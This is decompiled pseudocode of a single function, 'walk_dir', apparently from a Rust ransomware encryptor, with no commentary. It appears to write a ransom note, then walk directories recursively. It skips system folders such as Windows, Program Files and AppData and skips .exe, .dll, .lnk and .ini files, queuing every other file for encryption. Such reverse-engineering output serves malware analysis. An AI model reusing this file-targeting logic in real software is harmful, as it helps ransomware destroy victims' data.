volatile signed __int64 *linux_encryptor::files::walk_dir()
{
  __int64 v0; // rdx
  __int64 v1; // rax
  char v2; // cl
  char v3; // al
  char v4; // bp
  size_t v5; // rdx
  const void *v6; // rax
  const void *v7; // r12
  size_t v8; // rbx
  void *v9; // rax
  void *v10; // rbp
  char v11; // al
  char v12; // bp
  __int64 v13; // rsi
  size_t v14; // rdx
  const void *v15; // rax
  const void *v16; // r12
  size_t v17; // rbp
  void *v18; // rax
  void *v19; // rbx
  __int64 v20; // rsi
  char is_contained_in; // bp
  char v22; // bp
  char v23; // bp
  char v24; // bp
  char v25; // bp
  char v26; // bl
  char v27; // r12
  char v28; // r15
  char v29; // r15
  char v30; // r15
  size_t v31; // rbx
  char v32; // r12
  char v33; // bl
  volatile signed __int64 *result; // rax
  char v35; // al
  char **v36; // [rsp+0h] [rbp-138h]
  __int128 v37; // [rsp+8h] [rbp-130h]
  __int128 v38; // [rsp+30h] [rbp-108h] BYREF
  size_t v39; // [rsp+40h] [rbp-F8h]
  void *v40; // [rsp+48h] [rbp-F0h] BYREF
  size_t v41; // [rsp+50h] [rbp-E8h]
  size_t v42; // [rsp+58h] [rbp-E0h]
  __int128 v43; // [rsp+60h] [rbp-D8h] BYREF
  __int64 v44; // [rsp+70h] [rbp-C8h]
  volatile signed __int64 *v45; // [rsp+78h] [rbp-C0h] BYREF
  _OWORD v46[2]; // [rsp+80h] [rbp-B8h] BYREF
  __int128 v47; // [rsp+A0h] [rbp-98h]
  void *v48; // [rsp+B8h] [rbp-80h]
  __int128 v49; // [rsp+C0h] [rbp-78h]
  _OWORD v50[6]; // [rsp+D8h] [rbp-60h] BYREF

  linux_encryptor::files::create_note();
  std::sys::unix::fs::readdir();
  if ( v1 )
  {
    *(_QWORD *)&v50[0] = v0;
    switch ( v0 & 3 )
    {
      case 0LL:
        v2 = *(_BYTE *)(v0 + 16);
        break;
      case 1LL:
        v2 = *(_BYTE *)(v0 + 15);
        break;
      case 2LL:
        std::sys::unix::decode_error_kind();
        v2 = v35;
        break;
      case 3LL:
        v2 = 0;
        switch ( HIDWORD(v0) )
        {
          case 0:
            goto LABEL_100;
          case 1:
            v2 = 1;
            break;
          case 2:
            v2 = 2;
            break;
          case 3:
            v2 = 3;
            break;
          case 4:
            v2 = 4;
            break;
          case 5:
            v2 = 5;
            break;
          case 6:
            v2 = 6;
            break;
          case 7:
            v2 = 7;
            break;
          case 8:
            v2 = 8;
            break;
          case 9:
            v2 = 9;
            break;
          case 0xA:
            v2 = 10;
            break;
          case 0xB:
            v2 = 11;
            break;
          case 0xC:
            v2 = 12;
            break;
          case 0xD:
            v2 = 13;
            break;
          case 0xE:
            v2 = 14;
            break;
          case 0xF:
            v2 = 15;
            break;
          case 0x10:
            v2 = 16;
            break;
          case 0x11:
            v2 = 17;
            break;
          case 0x12:
            v2 = 18;
            break;
          case 0x13:
            v2 = 19;
            break;
          case 0x14:
            v2 = 20;
            break;
          case 0x15:
            v2 = 21;
            break;
          case 0x16:
            v2 = 22;
            break;
          case 0x17:
            v2 = 23;
            break;
          case 0x18:
            v2 = 24;
            break;
          case 0x19:
            v2 = 25;
            break;
          case 0x1A:
            v2 = 26;
            break;
          case 0x1B:
            v2 = 27;
            break;
          case 0x1C:
            v2 = 28;
            break;
          case 0x1D:
            v2 = 29;
            break;
          case 0x1E:
            v2 = 30;
            break;
          case 0x1F:
            v2 = 31;
            break;
          case 0x20:
            v2 = 32;
            break;
          case 0x21:
            v2 = 33;
            break;
          case 0x22:
            v2 = 34;
            break;
          case 0x23:
            v2 = 35;
            break;
          case 0x24:
            v2 = 36;
            break;
          case 0x25:
            v2 = 37;
            break;
          case 0x26:
            v2 = 38;
            break;
          case 0x27:
            v2 = 39;
            break;
          case 0x28:
            v2 = 40;
            break;
          default:
            v2 = 41;
            break;
        }
        break;
    }
LABEL_100:
    LOBYTE(v40) = v2;
    *(_QWORD *)&v46[0] = &v40;
    *((_QWORD *)&v46[0] + 1) = <std::io::error::ErrorKind as core::fmt::Display>::fmt;
    std::io::stdio::_print();
    return (volatile signed __int64 *)core::ptr::drop_in_place<std::io::error::Error>(v50);
  }
  v45 = (volatile signed __int64 *)v0;
  while ( 1 )
  {
    <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next();
    if ( LODWORD(v50[0]) == 2 )
      break;
    v47 = v50[2];
    v46[1] = v50[1];
    v46[0] = v50[0];
    if ( *(_QWORD *)&v50[0] )
      core::result::unwrap_failed();
    std::fs::DirEntry::path();
    std::path::Path::is_dir();
    v4 = v3;
    if ( (_QWORD)v37 )
      _rust_dealloc();
    if ( v4 )
    {
      if ( *(_QWORD *)&v46[0] )
        core::result::unwrap_failed();
      std::fs::DirEntry::path();
      std::sys::unix::os_str::Slice::to_str();
      v7 = v6;
      if ( !v6 )
        core::panicking::panic();
      v8 = v5;
      if ( v5 )
      {
        _rust_alloc();
        v10 = v9;
        if ( !v9 )
          alloc::alloc::handle_alloc_error();
      }
      else
      {
        v10 = &dword_0 + 1;
      }
      memcpy(v10, v7, v8);
      v40 = v10;
      v41 = v8;
      v42 = v8;
      <alloc::string::String as core::clone::Clone>::clone();
      v20 = v44;
      if ( *((_QWORD *)&v43 + 1) == v44 )
      {
        alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(&v43, v44, 1LL);
        v20 = v44;
      }
      *(_BYTE *)(v43 + v20) = 92;
      v39 = v20 + 1;
      v38 = v43;
      if ( v41 )
        _rust_dealloc();
      if ( (_QWORD)v37 )
        _rust_dealloc();
      alloc::str::<impl str>::to_lowercase();
      if ( (unsigned __int8)core::str::pattern::Pattern::is_contained_in(aOpenserver, 10LL, v40, v42) )
        goto LABEL_48;
      alloc::str::<impl str>::to_lowercase();
      is_contained_in = core::str::pattern::Pattern::is_contained_in(aWindows, 7LL, v36, *((_QWORD *)&v37 + 1));
      if ( (_QWORD)v37 )
        _rust_dealloc();
      if ( is_contained_in )
        goto LABEL_48;
      alloc::str::<impl str>::to_lowercase();
      v22 = core::str::pattern::Pattern::is_contained_in(aProgramFiles, 13LL, v36, *((_QWORD *)&v37 + 1));
      if ( (_QWORD)v37 )
        _rust_dealloc();
      if ( v22 )
        goto LABEL_48;
      alloc::str::<impl str>::to_lowercase();
      v23 = core::str::pattern::Pattern::is_contained_in(aRecycleBin, 11LL, v36, *((_QWORD *)&v37 + 1));
      if ( (_QWORD)v37 )
        _rust_dealloc();
      if ( v23 )
        goto LABEL_48;
      alloc::str::<impl str>::to_lowercase();
      v24 = core::str::pattern::Pattern::is_contained_in(aProgramdata, 11LL, v36, *((_QWORD *)&v37 + 1));
      if ( (_QWORD)v37 )
        _rust_dealloc();
      if ( v24 )
        goto LABEL_48;
      alloc::str::<impl str>::to_lowercase();
      v25 = core::str::pattern::Pattern::is_contained_in(aAppdata, 7LL, v36, *((_QWORD *)&v37 + 1));
      if ( (_QWORD)v37 )
        _rust_dealloc();
      if ( v25 )
      {
LABEL_48:
        v26 = 0;
        if ( v41 )
          goto LABEL_49;
      }
      else
      {
        alloc::str::<impl str>::to_lowercase();
        v33 = core::str::pattern::Pattern::is_contained_in(aAllUsers, 9LL, v36, *((_QWORD *)&v37 + 1));
        if ( (_QWORD)v37 )
          _rust_dealloc();
        v26 = v33 ^ 1;
        if ( v41 )
LABEL_49:
          _rust_dealloc();
      }
      if ( v26 )
        linux_encryptor::files::walk_dir(&v38);
      v13 = *((_QWORD *)&v38 + 1);
      if ( *((_QWORD *)&v38 + 1) )
        goto LABEL_53;
      goto LABEL_54;
    }
    if ( *(_QWORD *)&v46[0] )
      core::result::unwrap_failed();
    std::fs::DirEntry::path();
    std::path::Path::is_file();
    v12 = v11;
    v13 = v37;
    if ( (_QWORD)v37 )
      _rust_dealloc();
    if ( !v12 )
      goto LABEL_54;
    if ( *(_QWORD *)&v46[0] )
      core::result::unwrap_failed();
    std::fs::DirEntry::path();
    std::sys::unix::os_str::Slice::to_str();
    v16 = v15;
    if ( !v15 )
      core::panicking::panic();
    v17 = v14;
    if ( v14 )
    {
      _rust_alloc();
      v19 = v18;
      if ( !v18 )
        alloc::alloc::handle_alloc_error();
    }
    else
    {
      v19 = &dword_0 + 1;
    }
    memcpy(v19, v16, v17);
    *(_QWORD *)&v38 = v19;
    *((_QWORD *)&v38 + 1) = v17;
    v39 = v17;
    if ( (_QWORD)v37 )
      _rust_dealloc();
    alloc::str::<impl str>::to_lowercase();
    if ( (unsigned __int8)core::str::pattern::Pattern::is_contained_in(aIni, 4LL, v43, v44) )
    {
      v27 = 0;
      if ( !*((_QWORD *)&v43 + 1) )
        goto LABEL_65;
LABEL_64:
      _rust_dealloc();
      goto LABEL_65;
    }
    alloc::str::<impl str>::to_lowercase();
    v28 = core::str::pattern::Pattern::is_contained_in(aExe, 4LL, v36, *((_QWORD *)&v37 + 1));
    if ( (_QWORD)v37 )
      _rust_dealloc();
    if ( v28 )
      goto LABEL_81;
    alloc::str::<impl str>::to_lowercase();
    v29 = core::str::pattern::Pattern::is_contained_in(aDll, 4LL, v36, *((_QWORD *)&v37 + 1));
    if ( (_QWORD)v37 )
      _rust_dealloc();
    if ( v29 )
      goto LABEL_81;
    alloc::str::<impl str>::to_lowercase();
    v30 = core::str::pattern::Pattern::is_contained_in(aLnk, 4LL, v36, *((_QWORD *)&v37 + 1));
    if ( (_QWORD)v37 )
      _rust_dealloc();
    if ( v30 )
    {
LABEL_81:
      v27 = 0;
    }
    else
    {
      alloc::str::<impl str>::to_lowercase();
      v48 = v40;
      v31 = v42;
      core::str::converts::from_utf8();
      if ( v36 )
      {
        v49 = v37;
        core::result::unwrap_failed();
      }
      alloc::str::<impl str>::to_lowercase();
      v32 = core::str::pattern::Pattern::is_contained_in(0LL, *((_QWORD *)&v37 + 1), v48, v31);
      if ( (_QWORD)v37 )
        _rust_dealloc();
      if ( v41 )
        _rust_dealloc();
      v27 = v32 ^ 1;
    }
    if ( *((_QWORD *)&v43 + 1) )
      goto LABEL_64;
LABEL_65:
    if ( v27 )
    {
      if ( *(_QWORD *)&v46[0] )
        core::result::unwrap_failed();
      std::fs::DirEntry::path();
      *(_QWORD *)&v43 = v40;
      *((_QWORD *)&v43 + 1) = v42;
      *(_QWORD *)&v49 = &v43;
      *((_QWORD *)&v49 + 1) = <std::path::Display as core::fmt::Display>::fmt;
      v36 = &off_74228;
      v37 = 2uLL;
      std::io::stdio::_print();
      if ( v41 )
        _rust_dealloc();
      linux_encryptor::files::add_file(&v38);
    }
    v13 = *((_QWORD *)&v38 + 1);
    if ( *((_QWORD *)&v38 + 1) )
LABEL_53:
      _rust_dealloc();
LABEL_54:
    if ( *(_QWORD *)&v46[0] )
    {
      core::ptr::drop_in_place<std::io::error::Error>((char *)v46 + 8);
    }
    else
    {
      if ( !_InterlockedSub64(*((volatile signed __int64 **)&v46[0] + 1), 1uLL) )
        alloc::sync::Arc<T>::drop_slow((char *)v46 + 8, v13);
      *(_BYTE *)v47 = 0;
      if ( *((_QWORD *)&v47 + 1) )
        _rust_dealloc();
    }
  }
  result = v45;
  if ( !_InterlockedSub64(v45, 1uLL) )
    return (volatile signed __int64 *)alloc::sync::Arc<T>::drop_slow(&v45, &v45);
  return result;
}
